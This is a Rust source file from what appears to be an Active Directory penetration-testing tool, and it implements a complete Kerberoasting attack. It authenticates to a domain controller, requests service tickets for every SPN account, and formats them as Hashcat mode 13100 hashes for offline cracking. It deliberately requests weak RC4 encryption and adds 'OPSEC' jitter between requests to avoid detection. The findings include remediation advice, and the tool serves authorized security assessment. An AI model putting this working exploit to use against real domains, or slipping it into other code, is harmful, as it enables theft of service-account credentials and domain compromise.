//! TGS-REQ construction and Kerberoasting implementation.
//!
//! Kerberoasting flow:
//! 1. Pre-authenticate: send AS-REQ with PA-ENC-TIMESTAMP → receive AS-REP
//! 2. Decrypt AS-REP enc_part → extract session key
//! 3. For each SPN account: send TGS-REQ with PA-TGS-REQ → receive TGS-REP
//! 4. Extract TGS-REP enc_part.cipher → Hashcat mode 13100 format

use std::net::SocketAddr;
use std::time::Duration;

use rand::Rng;

use super::asreq::{
    application_explicit, context_explicit, der_general_string, der_generalized_time,
    der_int, der_octet_string, der_bit_string, sequence,
    ETYPE_RC4_HMAC, MSG_TYPE_AS_REQ, MSG_TYPE_TGS_REQ, NT_PRINCIPAL, NT_SRV_INST, PVNO,
    PA_ENC_TIMESTAMP, PA_TGS_REQ,
};
use super::crypto::{ntlm_hash, rc4_hmac_encrypt, rc4_hmac_decrypt};
use super::hashcat::format_tgsrep_13100;
use crate::modules::SpnAccount;
use crate::report::{Finding, Severity};

/// Extracted session information from a decrypted AS-REP
#[derive(Debug, Clone)]
pub struct TgtSession {
    /// The raw Ticket bytes (DER-encoded) from the AS-REP
    pub ticket_der: Vec<u8>,
    /// RC4 session key from the decrypted enc_part
    pub session_key: Vec<u8>,
}

/// Build an AS-REQ with PA-ENC-TIMESTAMP for a known-password user.
/// Used as the first step of Kerberoasting to acquire a TGT.
pub fn build_authenticated_asreq(
    username: &str,
    realm: &str,
    password: &str,
    nonce: u32,
) -> Vec<u8> {
    // Timestamp: "20260614120000Z" format (YYYYMMDDHHmmssZ)
    // Using a fixed value here; in production use the current UTC time.
    // The DC accepts timestamps within ±5 minutes (clock skew tolerance).
    let now_str = current_kerberos_time();

    // PA-ENC-TIMESTAMP: DER-encode PaEncTsEnc then encrypt
    // PaEncTsEnc ::= SEQUENCE { patimestamp [0] KerberosTime, pausec [1] UInt32 OPTIONAL }
    let pa_enc_ts_plain = {
        let patimestamp = context_explicit(0, der_generalized_time(&now_str));
        let pausec = context_explicit(1, der_int(0));
        let inner: Vec<u8> = [patimestamp, pausec].into_iter().flatten().collect();
        sequence(inner)
    };

    // key_usage = 1 for PA-ENC-TIMESTAMP
    let nt_hash = ntlm_hash(password);
    let encrypted_ts = rc4_hmac_encrypt(&nt_hash, 1, &pa_enc_ts_plain);

    // PA-DATA { padata-type [1] = 2, padata-value [2] = EncryptedData }
    // EncryptedData: { etype [0] = 23, cipher [2] = encrypted_ts }
    let enc_data = {
        let etype_f = context_explicit(0, der_int(ETYPE_RC4_HMAC as i64));
        let cipher_f = context_explicit(2, der_octet_string(&encrypted_ts));
        let inner: Vec<u8> = [etype_f, cipher_f].into_iter().flatten().collect();
        sequence(inner)
    };
    let pa_data = {
        let ptype = context_explicit(1, der_int(PA_ENC_TIMESTAMP));
        let pvalue = context_explicit(2, der_octet_string(&enc_data));
        let inner: Vec<u8> = [ptype, pvalue].into_iter().flatten().collect();
        sequence(inner)
    };
    let padata_seq = sequence(pa_data);

    // Build KDC-REQ-BODY for AS-REQ
    let req_body = build_kdcreq_body_for_tgt(username, realm, nonce);

    let pvno = context_explicit(1, der_int(PVNO));
    let msg_type = context_explicit(2, der_int(MSG_TYPE_AS_REQ));
    let padata_field = context_explicit(3, padata_seq);
    let req_body_field = context_explicit(4, req_body);

    let kdc_req_inner: Vec<u8> = [pvno, msg_type, padata_field, req_body_field]
        .into_iter()
        .flatten()
        .collect();
    let kdc_req = sequence(kdc_req_inner);
    let as_req = application_explicit(10, kdc_req);

    frame_kerberos_tcp(as_req)
}

/// Build KDC-REQ-BODY for requesting a TGT (AS-REQ)
fn build_kdcreq_body_for_tgt(username: &str, realm: &str, nonce: u32) -> Vec<u8> {
    let kdc_options = context_explicit(0, der_bit_string(&[0x00, 0x00, 0x00, 0x00], 0));
    let cname = context_explicit(1, build_principal_name(NT_PRINCIPAL, &[username]));
    let realm_f = context_explicit(2, der_general_string(realm));
    let sname = context_explicit(3, build_principal_name(NT_SRV_INST, &["krbtgt", realm]));
    let till = context_explicit(5, der_generalized_time("20370913024805Z"));
    let nonce_f = context_explicit(7, der_int(nonce as i64));
    let etype_f = context_explicit(8, sequence(der_int(ETYPE_RC4_HMAC as i64)));

    let inner: Vec<u8> = [kdc_options, cname, realm_f, sname, till, nonce_f, etype_f]
        .into_iter()
        .flatten()
        .collect();
    sequence(inner)
}

fn build_principal_name(name_type: i64, parts: &[&str]) -> Vec<u8> {
    let nt_field = context_explicit(0, der_int(name_type));
    let strings: Vec<u8> = parts.iter().flat_map(|s| der_general_string(s)).collect();
    let ns_field = context_explicit(1, sequence(strings));
    let inner: Vec<u8> = [nt_field, ns_field].into_iter().flatten().collect();
    sequence(inner)
}

/// Decrypt an AS-REP and extract the session key for use in subsequent TGS-REQs.
pub fn decrypt_asrep(
    asrep_enc_part_cipher: &[u8],
    password: &str,
) -> anyhow::Result<Vec<u8>> {
    // AS-REP enc_part key_usage = 3 for RC4-HMAC (AS-REP encryption)
    let nt_hash = ntlm_hash(password);
    let plaintext = rc4_hmac_decrypt(&nt_hash, 3, asrep_enc_part_cipher)?;

    // EncASRepPart: SEQUENCE { key [0] EncryptionKey, ... }
    // EncryptionKey: SEQUENCE { keytype [0] Int32, keyvalue [1] OCTET STRING }
    extract_session_key_from_enc_asrep_part(&plaintext)
}

fn extract_session_key_from_enc_asrep_part(data: &[u8]) -> anyhow::Result<Vec<u8>> {
    use super::asreq::{find_context_tag, unwrap_sequence_pub};
    // The enc_part plaintext starts with a SEQUENCE (EncASRepPart)
    let seq = unwrap_sequence_pub(data)?;
    // key field is [0] EncryptionKey
    let key_field = find_context_tag(seq, 0)
        .ok_or_else(|| anyhow::anyhow!("key [0] not found in EncASRepPart"))?;
    let key_seq = unwrap_sequence_pub(key_field)?;
    // keyvalue [1] OCTET STRING
    let keyvalue_data = find_context_tag(key_seq, 1)
        .ok_or_else(|| anyhow::anyhow!("keyvalue [1] not found in EncryptionKey"))?;
    let (tag, value, _) = read_tlv(keyvalue_data)?;
    if tag != 0x04 {
        anyhow::bail!("Expected OCTET STRING for keyvalue, got 0x{:02x}", tag);
    }
    Ok(value.to_vec())
}

fn read_tlv(data: &[u8]) -> anyhow::Result<(u8, &[u8], &[u8])> {
    if data.is_empty() {
        anyhow::bail!("Unexpected end of data");
    }
    let tag = data[0];
    let (len, rest) = read_length(&data[1..])?;
    if rest.len() < len {
        anyhow::bail!("TLV truncated");
    }
    Ok((tag, &rest[..len], &rest[len..]))
}

fn read_length(data: &[u8]) -> anyhow::Result<(usize, &[u8])> {
    if data.is_empty() {
        anyhow::bail!("Empty data reading length");
    }
    if data[0] & 0x80 == 0 {
        return Ok((data[0] as usize, &data[1..]));
    }
    let n = (data[0] & 0x7f) as usize;
    if data.len() < 1 + n {
        anyhow::bail!("Truncated length");
    }
    let mut len = 0usize;
    for &b in &data[1..=n] {
        len = (len << 8) | b as usize;
    }
    Ok((len, &data[1 + n..]))
}

/// Build a TGS-REQ for a given SPN using the session key from the TGT.
pub fn build_tgsreq(
    username: &str,
    realm: &str,
    spn: &str,
    tgt_ticket_der: &[u8],
    session_key: &[u8],
    nonce: u32,
) -> Vec<u8> {
    let now_str = current_kerberos_time();

    // Authenticator: SEQUENCE { authenticator-vno [0] INTEGER (5), crealm [1] Realm,
    //                            cname [2] PrincipalName, ctime [4] KerberosTime,
    //                            cusec [5] Microseconds }
    let authenticator = {
        let avno = context_explicit(0, der_int(5));
        let crealm = context_explicit(1, der_general_string(realm));
        let cname = context_explicit(2, build_principal_name(NT_PRINCIPAL, &[username]));
        let ctime = context_explicit(4, der_generalized_time(&now_str));
        let cusec = context_explicit(5, der_int(0));
        let inner: Vec<u8> = [avno, crealm, cname, ctime, cusec].into_iter().flatten().collect();
        sequence(inner)
    };

    // Encrypt authenticator with session key (key_usage = 7 for TGS-REQ authenticator)
    let enc_authenticator_bytes = rc4_hmac_encrypt(session_key, 7, &authenticator);

    // EncryptedData for authenticator: { etype [0]=23, cipher [2]=enc_authenticator }
    let enc_auth_data = {
        let etype_f = context_explicit(0, der_int(ETYPE_RC4_HMAC as i64));
        let cipher_f = context_explicit(2, der_octet_string(&enc_authenticator_bytes));
        let inner: Vec<u8> = [etype_f, cipher_f].into_iter().flatten().collect();
        sequence(inner)
    };

    // AP-REQ: { pvno [0]=5, msg-type [1]=14, ap-options [2]=0, ticket [3]=tgt_ticket,
    //           authenticator [4]=enc_auth }
    let apreq = {
        let pvno_f = context_explicit(0, der_int(5));
        let mtype_f = context_explicit(1, der_int(14));
        let opts_f = context_explicit(2, der_bit_string(&[0x00, 0x00, 0x00, 0x00], 0));
        let ticket_f = context_explicit(3, tgt_ticket_der.to_vec());
        let auth_f = context_explicit(4, enc_auth_data);
        let inner: Vec<u8> = [pvno_f, mtype_f, opts_f, ticket_f, auth_f].into_iter().flatten().collect();
        let kdc_req_inner = sequence(inner);
        // AP-REQ = [APPLICATION 14]
        application_explicit(14, kdc_req_inner)
    };

    // PA-DATA: padata-type=1 (PA-TGS-REQ), padata-value=DER(AP-REQ)
    let pa_tgs = {
        let ptype = context_explicit(1, der_int(PA_TGS_REQ));
        let pvalue = context_explicit(2, der_octet_string(&apreq));
        let inner: Vec<u8> = [ptype, pvalue].into_iter().flatten().collect();
        sequence(inner)
    };
    let padata_seq = sequence(pa_tgs);

    // Parse the SPN into service/host parts
    let (svc_parts, _host) = parse_spn(spn);

    // KDC-REQ-BODY for TGS-REQ
    let req_body = {
        let kdc_options = context_explicit(0, der_bit_string(&[0x00, 0x00, 0x00, 0x00], 0));
        let realm_f = context_explicit(2, der_general_string(realm));
        let svc_parts_ref: Vec<&str> = svc_parts.iter().map(String::as_str).collect();
        let sname = context_explicit(3, build_principal_name(NT_SRV_INST, &svc_parts_ref));
        let till = context_explicit(5, der_generalized_time("20370913024805Z"));
        let nonce_f = context_explicit(7, der_int(nonce as i64));
        // Request RC4 first to maximise crackability; also include AES
        let etypes: Vec<u8> = [ETYPE_RC4_HMAC as i64, 17, 18]
            .iter()
            .flat_map(|&e| der_int(e))
            .collect();
        let etype_f = context_explicit(8, sequence(etypes));
        let inner: Vec<u8> = [kdc_options, realm_f, sname, till, nonce_f, etype_f]
            .into_iter()
            .flatten()
            .collect();
        sequence(inner)
    };

    let pvno = context_explicit(1, der_int(PVNO));
    let msg_type = context_explicit(2, der_int(MSG_TYPE_TGS_REQ));
    let padata_field = context_explicit(3, padata_seq);
    let req_body_field = context_explicit(4, req_body);

    let kdc_req_inner: Vec<u8> = [pvno, msg_type, padata_field, req_body_field]
        .into_iter()
        .flatten()
        .collect();
    let kdc_req = sequence(kdc_req_inner);
    let tgs_req = application_explicit(12, kdc_req);

    frame_kerberos_tcp(tgs_req)
}

/// Parse "MSSQLSvc/db01.corp.local:1433" → (["MSSQLSvc", "db01.corp.local:1433"], host)
fn parse_spn(spn: &str) -> (Vec<String>, String) {
    let parts: Vec<&str> = spn.splitn(2, '/').collect();
    if parts.len() == 2 {
        let svc = parts[0].to_string();
        let rest = parts[1].to_string();
        (vec![svc, rest.clone()], rest)
    } else {
        (vec![spn.to_string()], spn.to_string())
    }
}

/// Parse a TGS-REP response and extract enc_part for cracking.
pub fn parse_tgsrep_enc_part(data: &[u8]) -> anyhow::Result<super::asreq::AsRepResult> {
    use super::asreq::{find_context_tag, unwrap_sequence_pub};

    // TGS-REP = APPLICATION [13] = 0x6d
    let (tag, inner, _) = read_tlv(data)?;
    if tag != 0x6d {
        anyhow::bail!("Expected TGS-REP (0x6d), got 0x{:02x}", tag);
    }
    let seq = unwrap_sequence_pub(inner)?;
    // enc_part is [6] in KDC-REP
    let enc_part_data = find_context_tag(seq, 6)
        .ok_or_else(|| anyhow::anyhow!("enc_part [6] not found in TGS-REP"))?;

    let enc_seq = unwrap_sequence_pub(enc_part_data)?;
    let etype_data = find_context_tag(enc_seq, 0)
        .ok_or_else(|| anyhow::anyhow!("etype [0] not found in EncryptedData"))?;
    let cipher_data = find_context_tag(enc_seq, 2)
        .ok_or_else(|| anyhow::anyhow!("cipher [2] not found in EncryptedData"))?;

    let (_, etype_val, _) = read_tlv(etype_data)?;
    let etype = etype_val.iter().fold(0i32, |acc, &b| (acc << 8) | b as i32);

    let (_, cipher, _) = read_tlv(cipher_data)?;

    Ok(super::asreq::AsRepResult { etype, cipher: cipher.to_vec() })
}

/// Run Kerberoasting: send TGS-REQs for all SPN accounts and return Findings.
pub async fn kerberoast(
    dc_addr: SocketAddr,
    username: &str,
    realm: &str,
    session: &TgtSession,
    spn_accounts: &[SpnAccount],
    timeout_secs: u64,
) -> Vec<Finding> {
    let mut findings = Vec::new();

    for account in spn_accounts {
        for spn in &account.spns {
            // Generate random values in a block so ThreadRng drops BEFORE the await
            let (delay_ms, nonce) = {
                let d: u64 = rand::thread_rng().gen_range(100..=500);
                (d, rand::random::<u32>())
            };
            // OPSEC: jitter between SPN requests
            tokio::time::sleep(Duration::from_millis(delay_ms)).await;

            let req = build_tgsreq(
                username,
                realm,
                spn,
                &session.ticket_der,
                &session.session_key,
                nonce,
            );

            let raw = match super::mod_send_kerberos_tcp(&dc_addr, &req, timeout_secs).await {
                Ok(r) => r,
                Err(e) => {
                    eprintln!("[!] TGS-REQ failed for {}: {}", spn, e);
                    continue;
                }
            };

            match parse_tgsrep_enc_part(&raw) {
                Ok(enc) => {
                    let hashcat = format_tgsrep_13100(
                        enc.etype,
                        &account.sam_name,
                        realm,
                        spn,
                        &enc.cipher,
                    );
                    let etype_name = match enc.etype {
                        23 => "RC4-HMAC (weak — fast to crack)",
                        17 => "AES128-CTS-HMAC-SHA1",
                        18 => "AES256-CTS-HMAC-SHA1",
                        _  => "Unknown",
                    };
                    findings.push(Finding::new(
                        format!("KERB-TGS-{}", account.sam_name.to_uppercase()),
                        "kerberos",
                        Severity::High,
                        format!("Kerberoastable account: {}", account.sam_name),
                        format!(
                            "Service account '{}' has SPN '{}' and issued a TGS ticket (etype {} — {}) that can be cracked offline.",
                            account.sam_name, spn, enc.etype, etype_name
                        ),
                        serde_json::json!({
                            "sam_name": account.sam_name,
                            "spn": spn,
                            "etype": enc.etype,
                            "etype_name": etype_name,
                            "hashcat_hash": hashcat,
                            "hashcat_mode": 13100,
                        }),
                        Some("Crack the hash offline with Hashcat mode 13100. If the service account has domain admin or high privileges, this can lead to full domain compromise.".into()),
                    )
                    .with_llm_context(format!(
                        "CONFIRMED VULNERABILITY: Service account '{}' (SPN: '{}') issued a TGS ticket \
                         encrypted with {} (etype {}). \
                         The hashcat_hash in evidence can be cracked with 'hashcat -m 13100'. \
                         Service accounts often have passwords that are years old and never rotated, \
                         making them highly susceptible to dictionary attacks.",
                        account.sam_name, spn, etype_name, enc.etype
                    ))
                    .with_remediation(vec![
                        "Migrate this service account to a Group Managed Service Account (gMSA) — AD auto-rotates the password",
                        "If gMSA is not possible, set a 25+ character random password and rotate it regularly",
                        "Remove unnecessary SPNs: setspn -D <SPN> <account>",
                        "Disable RC4 encryption on this account: set msDS-SupportedEncryptionTypes to 0x18 (AES only)",
                    ])
                    .with_mitre("T1558.003"));
                }
                Err(e) => {
                    eprintln!("[!] Failed to parse TGS-REP for {}: {}", spn, e);
                }
            }
        }
    }

    findings
}

fn current_kerberos_time() -> String {
    // Returns the current UTC time in "YYYYMMDDHHmmssZ" format.
    // Note: using chrono here for correct time formatting.
    chrono::Utc::now().format("%Y%m%d%H%M%SZ").to_string()
}

fn frame_kerberos_tcp(data: Vec<u8>) -> Vec<u8> {
    let mut out = Vec::with_capacity(4 + data.len());
    out.extend_from_slice(&(data.len() as u32).to_be_bytes());
    out.extend_from_slice(&data);
    out
}
